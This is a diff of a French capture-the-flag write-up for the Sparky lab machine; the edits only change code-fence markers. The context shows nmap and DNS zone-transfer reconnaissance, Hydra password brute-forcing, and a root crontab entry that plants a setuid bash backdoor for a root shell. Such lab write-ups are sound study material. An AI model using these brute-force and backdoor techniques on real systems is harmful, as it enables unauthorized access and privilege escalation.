@@ -10,7 +10,7 @@ Dans ma lancée j'ai continué avec le CTF Sparky de [iamv1nc3nt](https://iamv1n
 
 Le challenge se présente comme de difficulté moyenne / difficile mais je pense surtout qu'il manquait une information toute bête pour qu'il soit réalisable.  
 
-```plain
+```
 $ sudo nmap -T5 -p- -sCV 192.168.56.26 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 17:40 CET 
 Nmap scan report for 192.168.56.26 
@@ -40,7 +40,7 @@ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Remarquant la présence d'un serveur DNS j'ai tenté de faire une résolution inverse sur la machine pour voir si j'obtenais un nom de domaine :  
 
-```plain
+```
 $ dig -x 127.0.0.1 @192.168.56.26 
 
 ; <<>> DiG 9.16.25 <<>> -x 127.0.0.1 @192.168.56.26 
@@ -72,7 +72,7 @@ On tombe sur une demande d'authentification Basic mais à ce stade on ne dispose
 
 On serait tenté de lancer Hydra dessus avec une liste d'utilisateurs, une bonne wordlists pour les mots de passe et un gros parallélisme :  
 
-```plain
+```
 $ hydra -t 50 -L unix_users.txt -P rockyou.txt http-head://192.168.56.26:9898
 [STATUS] 25113.00 tries/min, 25113 tries in 00:01h, 2409831903 to do in 1599:20h, 50 active
 ```
@@ -98,7 +98,7 @@ Rue du password
 
 A vrai dire une fois qu'on dispose du nom d'utilisateur ce n'est pas la joie non plus :  
 
-```plain
+```
 $ hydra -t 50 -l web -P rockyou.txt http-head://192.168.56.26:9898                     
 Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 
 
@@ -125,7 +125,7 @@ Une fois connecté on trouve une appli web de type carnet d'adresse dont le proj
 
 Parmi les adresses enregistrées on note les adresses emails suivantes :  
 
-```plain
+```
 btaylor@sparky.local
 jtaylor@sparky.local
 staylor@sparky.local
@@ -133,7 +133,7 @@ staylor@sparky.local
 
 On a donc un domaine, ce qui peut nous servir pour tenter un transfert de zone :  
 
-```plain
+```
 $ dig -t axfr sparky.local @192.168.56.26 
 
 ; <<>> DiG 9.16.25 <<>> -t axfr sparky.local @192.168.56.26 
@@ -156,13 +156,13 @@ On remarque un enregistrement TXT étrange qui se décode en base64 en *dUmbrell
 
 C'est à ce moment là qu'il fallait de bons yeux sans quoi on peut y passer des heures encore. L'adresse de *Stacey Taylor* dans le carnet d'adresse contient un mot de passe :  
 
-```plain
+```
 1313 Mockingbird Lane, pass: NumbBell1745, Anytown, USA, 11111
 ```
 
 Grace à cette indication on peut se connecter sur le compte SSH *staylor* :  
 
-```plain
+```
 staylor@sparky:~$ sudo -l 
 [sudo] password for staylor:  
 Matching Defaults entries for staylor on sparky: 
@@ -176,13 +176,13 @@ no crontab for root
 
 On peut se servir de crontab avec les droits de l'utilisateur root. Si on édite sa crontab avec l'option *-e* on peut par exemple ajouter l'entrée suivante :  
 
-```plain
+```
 * * * * * cp /bin/bash /tmp/g0tr00t && chmod 4755 /tmp/g0troot
 ```
 
 Mais tout ce que j'obtiens c'est :  
 
-```plain
+```
 -rwxr-xr-x 1 root root 1183448 Feb 10 14:22 g0tr00t
 ```
 
@@ -200,13 +200,13 @@ python3 -c 'import os; os.chmod("/tmp/g0tr00t", 0o4755)'
 
 Et là ça marche :  
 
-```plain
+```
 -rwsr-xr-x  1 root root 1183448 Feb 10 14:25 g0tr00t
 ```
 
 On peut alors profiter de notre backdoor :  
 
-```plain
+```
 staylor@sparky:~$ /tmp/g0tr00t -p 
 g0tr00t-5.0# id 
 uid=1002(staylor) gid=1002(staylor) euid=0(root) groups=1002(staylor) 
@@ -222,7 +222,7 @@ Reliques
 
 En regardant la liste des utilisateurs on en remarque deux autres :  
 
-```plain
+```
 sparky:x:1000:1000:Sparky:/home/sparky:/bin/bash 
 jbottoms:x:1001:1001:,,,:/home/jbottoms:/bin/bash 
 staylor:x:1002:1002:,,,:/home/staylor:/bin/bash 
